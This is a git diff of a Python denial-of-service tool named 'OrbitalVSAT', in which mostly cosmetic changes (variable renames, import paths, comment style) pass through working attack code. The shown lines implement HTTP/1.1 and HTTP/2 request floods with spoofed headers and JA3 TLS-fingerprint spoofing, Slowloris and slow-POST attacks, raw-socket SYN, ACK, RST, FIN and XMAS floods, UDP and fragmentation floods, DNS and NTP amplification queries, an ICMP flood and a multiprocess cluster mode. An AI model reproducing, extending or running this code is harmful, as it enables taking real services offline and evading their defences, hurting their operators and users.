@@ -4,12 +4,12 @@
 # Author: MatrixTM26
 # GitHub: @MatrixTM26 | https://github.com/MatrixTM26
 # Release: November 25th, 2025
-# Version: VSAT.2.0
+# Version: 2.0
 # All Layers [ 3 | 4 | 7 ] + HTTP/2 + HTTP/3 + JA3 Spoof + Multi Methods
 # Note: For some features is under development. i will realease it ASAP
 
 try:
-    import multiprocessing as mp
+    import multiprocessing as MP
     import os
     import random
     import socket
@@ -18,14 +18,14 @@ try:
     import sys
     import threading
     import time
-    from cores.stdio import Clear, StrObject
-    from cores.logo import Banner, Helper
-    from cores.color import Color
+    from lib.core.StdIO import Clear, StrObject
+    from lib.core.ANSIColor import Color
+    from lib.config.Logo import Banner, Helper
     from concurrent.futures import ThreadPoolExecutor
     from time import sleep
     from urllib.parse import urlencode, urlparse
 
-    # HTTP/2
+    """HTTP/2"""
     try:
         import h2.config
         import h2.connection
@@ -34,7 +34,7 @@ try:
     except ImportError:
         HasH2 = False
 
-    # HTTP/3
+    """HTTP/3"""
     try:
         import asyncio
         from aioquic.asyncio.client import connect
@@ -51,7 +51,7 @@ except ModuleNotFoundError as e:
     )
     sys.exit(1)
 
-# JA3 Profiles
+"""JA3 Profiles"""
 JA3Profiles = {
     "chrome": {
         "ciphers": [
@@ -106,18 +106,18 @@ class OrbitalVSAT:
         self.Duration = 60
         self.Protocol = "h1"
         self.ClusterMode = False
-        self.Processes = mp.cpu_count()
+        self.Processes = MP.cpu_count()
         self.JAProfiles = "chrome"
-        self.Running = mp.Value("i", 0)
-        self.RequestsCount = mp.Value("i", 0)
-        self.BytesSent = mp.Value("i", 0)
-        self.StatsLock = mp.Lock()
+        self.Running = MP.Value("i", 0)
+        self.RequestsCount = MP.Value("i", 0)
+        self.BytesSent = MP.Value("i", 0)
+        self.StatsLock = MP.Lock()
         self.DefaultUA = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
         ]
 
-    def DocLoader(self, Filename, Default):
+    def ImportFiles(self, Filename, Default):
         if os.path.exists(Filename):
             try:
                 with open(Filename, "r") as f:
@@ -157,7 +157,7 @@ class OrbitalVSAT:
                 f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.white} CANNOT RESOLVE: {Color.red} {self.Host} {Color.reset}"
             )
             raise
-        self.useragents = self.DocLoader("UA.txt", self.DefaultUA)
+        self.UserAgents = self.ImportFiles("UA.txt", self.DefaultUA)
         StrObject.Typewriter(
             f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TARGET: {Color.white} {self.Target} {Color.reset}"
         )
@@ -197,41 +197,41 @@ class OrbitalVSAT:
 
     def CreateJa3Socket(self):
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.settimeout(3)
-            sock.connect((self.IP, self.Port))
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            Sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            Sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            Sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            Sock.settimeout(3)
+            Sock.connect((self.IP, self.Port))
             if self.Scheme == "https":
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
-                profile = JA3Profiles[self.JAProfiles]
-                CipherNames = self.GetCipherNames(profile["ciphers"])
+                Context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                Context.check_hostname = False
+                Context.verify_mode = ssl.CERT_NONE
+                Context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
+                Profile = JA3Profiles[self.JAProfiles]
+                CipherNames = self.GetCipherNames(Profile["ciphers"])
                 try:
-                    context.set_ciphers(":".join(CipherNames))
+                    Context.set_ciphers(":".join(CipherNames))
                 except Exception:
-                    context.set_ciphers("ECDHE+AESGCM:!aNULL")
+                    Context.set_ciphers("ECDHE+AESGCM:!aNULL")
                 if self.Protocol == "h2":
-                    context.set_alpn_protocols(["h2", "http/1.1"])
+                    Context.set_alpn_protocols(["h2", "http/1.1"])
                 elif self.Protocol == "h3":
-                    context.set_alpn_protocols(["h3"])
+                    Context.set_alpn_protocols(["h3"])
                 else:
-                    context.set_alpn_protocols(["http/1.1"])
-                sock = context.wrap_socket(sock, server_hostname=self.Host)
-            return sock
+                    Context.set_alpn_protocols(["http/1.1"])
+                Sock = Context.wrap_socket(Sock, server_hostname=self.Host)
+            return Sock
         except Exception:
             return None
 
-    # LAYER 7 HTTP METHODS
+    """LAYER 7 HTTP METHODS"""
 
     def HTTPExecutor(self, ExecutorID):
         """HTTP/1.1 Worker For All HTTP Methods"""
         LocalCount = 0
         localBytes = 0
-        httpMethods = {
+        HTTPMethods = {
             "GET": "GET",
             "POST": "POST",
             "PUT": "PUT",
@@ -243,40 +243,40 @@ class OrbitalVSAT:
             "TRACE": "TRACE",
         }
         while self.Running.value:
-            sock = None
+            Sock = None
             try:
-                sock = self.CreateJa3Socket()
-                if not sock:
+                Sock = self.CreateJa3Socket()
+                if not Sock:
                     continue
                 for _ in range(500):
                     if not self.Running.value:
                         break
                     try:
                         if self.Method == "RANDOM":
-                            httpMethods = random.choice(list(httpMethods.values()))
+                            HTTPMethods = random.choice(list(HTTPMethods.values()))
                         else:
-                            httpMethods = httpMethods.get(self.Method, "GET")
-                        ua = random.choice(self.useragents)
+                            HTTPMethods = HTTPMethods.get(self.Method, "GET")
+                        ua = random.choice(self.UserAgents)
                         path = f"{self.path}?_={int(time.time() * 1000000)}&{self.RandomString(8)}"
-                        request = f"{httpMethods} {path} HTTP/1.1\r\n"
+                        request = f"{HTTPMethods} {path} HTTP/1.1\r\n"
                         request += f"Host: {self.Host}\r\n"
                         request += f"User-Agent: {ua}\r\n"
                         request += "Accept: */*\r\n"
                         request += f"X-Forwarded-For: {self.RandomIP()}\r\n"
                         request += "Connection: keep-alive\r\n"
-                        if httpMethods in ["POST", "PUT", "PATCH"]:
+                        if HTTPMethods in ["POST", "PUT", "PATCH"]:
                             body = ("X" * 65536).encode()
                             request += f"Content-Length: {len(body)}\r\n\r\n"
                             payload = request.encode() + body
                         else:
                             request += "\r\n"
                             payload = request.encode()
-                        sock.sendall(payload)
+                        Sock.sendall(payload)
                         LocalCount += 1
                         localBytes += len(payload)
                         try:
-                            sock.settimeout(0.0001)
-                            sock.recv(16384)
+                            Sock.settimeout(0.0001)
+                            Sock.recv(16384)
                         except Exception:
                             pass
                     except Exception:
@@ -290,9 +290,9 @@ class OrbitalVSAT:
             except Exception:
                 pass
             finally:
-                if sock:
+                if Sock:
                     try:
-                        sock.close()
+                        Sock.close()
                     except Exception:
                         pass
 
@@ -301,24 +301,24 @@ class OrbitalVSAT:
         Connections = []
         for _ in range(200):
             try:
-                sock = self.CreateJa3Socket()
-                if sock:
-                    sock.sendall(
+                Sock = self.CreateJa3Socket()
+                if Sock:
+                    Sock.sendall(
                         f"GET {self.path} HTTP/1.1\r\nHost: {self.Host}\r\n".encode()
                     )
-                    Connections.append(sock)
+                    Connections.append(Sock)
             except Exception:
                 pass
         while self.Running.value:
-            for sock in Connections[:]:
+            for Sock in Connections[:]:
                 try:
-                    sock.sendall(
+                    Sock.sendall(
                         f"X-{self.RandomString(5)}: {self.RandomString(10)}\r\n".encode()
                     )
                     with self.StatsLock:
                         self.RequestsCount.value += 1
                 except Exception:
-                    Connections.remove(sock)
+                    Connections.remove(Sock)
             sleep(10)
 
     def SlowPostExecutor(self, ExecutorID):
@@ -326,22 +326,22 @@ class OrbitalVSAT:
         Connections = []
         for _ in range(100):
             try:
-                sock = self.CreateJa3Socket()
-                if sock:
-                    req = f"POST {self.path} HTTP/1.1\r\nHost: {self.Host}\r\nContent-Length: 999999999\r\n\r\n"
-                    sock.sendall(req.encode())
-                    Connections.append(sock)
+                Sock = self.CreateJa3Socket()
+                if Sock:
+                    Requests = f"POST {self.path} HTTP/1.1\r\nHost: {self.Host}\r\nContent-Length: 999999999\r\n\r\n"
+                    Sock.sendall(Requests.encode())
+                    Connections.append(Sock)
             except Exception:
                 pass
         while self.Running.value:
-            for sock in Connections[:]:
+            for Sock in Connections[:]:
                 try:
-                    sock.sendall(self.RandomString(1).encode())
+                    Sock.sendall(self.RandomString(1).encode())
                 except Exception:
-                    Connections.remove(sock)
+                    Connections.remove(Sock)
             sleep(1)
 
-    # HTTP/2 METHODS
+    """HTTP/2 METHODS"""
 
     def H2Executor(self, ExecutorID):
         """HTTP/2 Worker With Priority"""
@@ -350,20 +350,20 @@ class OrbitalVSAT:
         LocalCount = 0
         localBytes = 0
         while self.Running.value:
-            sock = None
+            Sock = None
             h2Connection = None
             try:
-                sock = self.CreateJa3Socket()
-                if not sock:
+                Sock = self.CreateJa3Socket()
+                if not Sock:
                     continue
-                if self.Scheme == "https" and sock.selected_alpn_protocol() != "h2":
-                    sock.close()
+                if self.Scheme == "https" and Sock.selected_alpn_protocol() != "h2":
+                    Sock.close()
                     continue
                 config = h2.cores.H2Configuration(client_side=True)
                 h2Connection = h2.connection.H2Connection(config=config)
                 h2Connection.initiate_connection()
                 h2Connection.increment_flow_control_window(15663105)
-                sock.sendall(h2Connection.data_to_send())
+                Sock.sendall(h2Connection.data_to_send())
                 for StreamId in range(1, 513, 2):
                     if not self.Running.value:
                         break
@@ -377,7 +377,7 @@ class OrbitalVSAT:
                                 ":path",
                                 f"{self.path}?s={StreamId}&_{int(time.time() * 1000000)}",
                             ),
-                            ("user-agent", random.choice(self.useragents)),
+                            ("user-agent", random.choice(self.UserAgents)),
                         ]
                         h2Connection.send_headers(StreamId, headers)
                         if "POST" in self.Method:
@@ -388,7 +388,7 @@ class OrbitalVSAT:
                         if StreamId % 32 == 1:
                             data = h2Connection.data_to_send()
                             if data:
-                                sock.sendall(data)
+                                Sock.sendall(data)
                                 localBytes += len(data)
                         LocalCount += 1
                     except Exception:
@@ -407,9 +407,9 @@ class OrbitalVSAT:
                         h2Connection.close_connection()
                     except Exception:
                         pass
-                if sock:
+                if Sock:
                     try:
-                        sock.close()
+                        Sock.close()
                     except Exception:
                         pass
 
@@ -419,16 +419,16 @@ class OrbitalVSAT:
             return
 
         while self.Running.value:
-            sock = None
+            Sock = None
             h2Connection = None
             try:
-                sock = self.CreateJa3Socket()
-                if not sock:
+                Sock = self.CreateJa3Socket()
+                if not Sock:
                     continue
                 config = h2.cores.H2Configuration(client_side=True)
                 h2Connection = h2.connection.H2Connection(config=config)
                 h2Connection.initiate_connection()
-                sock.sendall(h2Connection.data_to_send())
+                Sock.sendall(h2Connection.data_to_send())
                 for _ in range(1000):
                     if not self.Running.value:
                         break
@@ -436,7 +436,7 @@ class OrbitalVSAT:
                         h2Connection.ping(os.urandom(8))
                         data = h2Connection.data_to_send()
                         if data:
-                            sock.sendall(data)
+                            Sock.sendall(data)
                         with self.StatsLock:
                             self.RequestsCount.value += 1
                     except Exception:
@@ -444,30 +444,30 @@ class OrbitalVSAT:
             except Exception:
                 pass
 
-    # LAYER 4 TCP METHODS
+    """LAYER 4 TCP METHODS"""
 
     def TCPExecutor(self, ExecutorID):
         """TCP Connection Flood"""
         LocalCount = 0
         while self.Running.value:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                sock.connect((self.IP, self.Port))
-                sock.sendall(os.urandom(2048))
+                Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                Sock.settimeout(2)
+                Sock.connect((self.IP, self.Port))
+                Sock.sendall(os.urandom(2048))
                 LocalCount += 1
                 if LocalCount >= 100:
                     with self.StatsLock:
                         self.RequestsCount.value += LocalCount
                     LocalCount = 0
-                sock.close()
+                Sock.close()
             except Exception:
                 pass
 
     def SYNExecutor(self, ExecutorID):
         """SYN Flood"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except PermissionError:
             return
         while self.Running.value:
@@ -498,7 +498,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
+                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
@@ -507,7 +507,7 @@ class OrbitalVSAT:
     def ACKExecutor(self, ExecutorID):
         """ACK Flood"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except PermissionError:
             return
         while self.Running.value:
@@ -538,7 +538,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
+                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
 
                 with self.StatsLock:
                     self.RequestsCount.value += 1
@@ -548,7 +548,7 @@ class OrbitalVSAT:
     def RSTExecutor(self, ExecutorID):
         """RST Flood"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except PermissionError:
             return
         while self.Running.value:
@@ -579,7 +579,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
+                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
@@ -588,7 +588,7 @@ class OrbitalVSAT:
     def FINExecutor(self, ExecutorID):
         """FIN Flood"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except PermissionError:
             return
         while self.Running.value:
@@ -619,7 +619,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
+                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
@@ -628,7 +628,7 @@ class OrbitalVSAT:
     def XMASExecutor(self, ExecutorID):
         """XMAS Flood (FIN+PSH+URG)"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except PermissionError:
             return
         while self.Running.value:
@@ -659,23 +659,23 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
+                Sock.sendto(IPHeader + TCPHeader, (self.IP, 0))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
                 pass
 
-    # LAYER 4 UDP METHODS
+    """LAYER 4 UDP METHODS"""
 
     def UDPExecutor(self, ExecutorID):
         """UDP Flood"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         LocalCount = 0
         localBytes = 0
         while self.Running.value:
             try:
                 data = os.urandom(65507)
-                sock.sendto(data, (self.IP, self.Port))
+                Sock.sendto(data, (self.IP, self.Port))
                 LocalCount += 1
                 localBytes += len(data)
                 if LocalCount >= 500:
@@ -689,13 +689,13 @@ class OrbitalVSAT:
 
     def UDPFragExecutor(self, ExecutorID):
         """UDP Fragmentation Flood"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         while self.Running.value:
             try:
                 for i in range(10):
                     frag = os.urandom(8192)
-                    sock.sendto(frag, (self.IP, self.Port))
+                    Sock.sendto(frag, (self.IP, self.Port))
                 with self.StatsLock:
                     self.RequestsCount.value += 10
             except Exception:
@@ -703,12 +703,12 @@ class OrbitalVSAT:
 
     def DNSAmpExecutor(self, ExecutorID):
         """DNS Amplification"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         DNSQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
         DNSQuery += b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
         while self.Running.value:
             try:
-                sock.sendto(DNSQuery, (self.IP, self.Port))
+                Sock.sendto(DNSQuery, (self.IP, self.Port))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
@@ -716,22 +716,22 @@ class OrbitalVSAT:
 
     def NTPAmpExecutor(self, ExecutorID):
         """NTP Amplification"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        Sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         NTPQuery = b"\x17\x00\x03\x2a" + b"\x00" * 4
         while self.Running.value:
             try:
-                sock.sendto(NTPQuery, (self.IP, self.Port))
+                Sock.sendto(NTPQuery, (self.IP, self.Port))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
             except Exception:
                 pass
 
-    # LAYER 3 ICMP METHODS
+    """LAYER 3 ICMP METHODS"""
 
     def ICMPExecutor(self, ExecutorID):
         """ICMP Flood"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         except PermissionError:
             return
         while self.Running.value:
@@ -743,7 +743,7 @@ class OrbitalVSAT:
                 header = struct.pack(
                     "!BBHHH", 8, 0, socket.htons(checksum), packetId, 1
                 )
-                sock.sendto(header + data, (self.IP, 0))
+                Sock.sendto(header + data, (self.IP, 0))
                 with self.StatsLock:
                     self.RequestsCount.value += 1
                     self.BytesSent.value += len(header + data)
@@ -761,7 +761,7 @@ class OrbitalVSAT:
         s += s >> 16
         return ~s & 0xFFFF
 
-    # CLUSTER & Stats
+    """Cluster & Stats"""
 
     def ClusterProcess(self, ProcessID):
         """Cluster Process"""
@@ -836,7 +836,7 @@ class OrbitalVSAT:
         if self.ClusterMode:
             processes = []
             for i in range(self.Processes):
-                p = mp.Process(target=self.ClusterProcess, args=(i,))
+                p = MP.Process(target=self.ClusterProcess, args=(i,))
                 p.start()
                 processes.append(p)
                 sleep(0.02)
